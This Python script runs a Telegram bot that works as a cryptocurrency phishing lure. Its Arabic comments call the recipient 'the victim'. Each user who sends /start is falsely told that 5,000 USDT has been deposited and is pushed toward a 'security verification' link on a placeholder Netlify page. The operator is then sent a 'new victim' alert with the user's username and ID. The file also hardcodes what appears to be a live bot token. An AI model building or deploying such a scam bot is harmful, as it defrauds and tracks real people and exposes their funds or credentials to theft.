#!/usr/bin/env python3
import telebot
import logging
from datetime import datetime

TOKEN = "8266899631:AAEUxiahvm8gnAreYXVS0Zjj5d153D7Ab-Y"
OWNER_ID = 8391968596

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

bot = telebot.TeleBot(TOKEN)

# 👇 غير هذا الرابط بعد رفع ملف index.html على Netlify
WEBAPP_URL = "https://your-site.netlify.app"

@bot.message_handler(commands=['start'])
def start(m):
    c = m.chat.id
    user = m.from_user
    
    # رسالة للضحية
    msg = (
        "🎉 *تهانينا! تم إيداع 5,000 USDT*\n\n"
        "📋 تفاصيل التحويل:\n"
        "• المبلغ: `5,000` USDT\n"
        "• الشبكة: TRC-20\n"
        "• الحالة: ✅ معلق\n\n"
        "⚠️ *لتأكيد الاستلام:*\n"
        "اضغط على الرابط أدناه لإتمام التحقق الأمني"
    )
    
    # زر يفتح الرابط
    markup = telebot.types.InlineKeyboardMarkup()
    btn = telebot.types.InlineKeyboardButton(
        "🔗 اضغط لتأكيد استلام 5,000 USDT",
        url=WEBAPP_URL
    )
    markup.add(btn)
    
    bot.send_message(c, msg, parse_mode='Markdown', reply_markup=markup)
    
    # إشعار لك
    bot.send_message(
        OWNER_ID,
        f"🆕 *ضحية جديدة!*\n"
        f"👤 @{user.username or 'N/A'}\n"
        f"🆔 `{user.id}`\n"
        f"⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        parse_mode='Markdown'
    )

print(f"✅ Bot running...")
print(f"🔗 WebApp: {WEBAPP_URL}")
bot.infinity_polling()
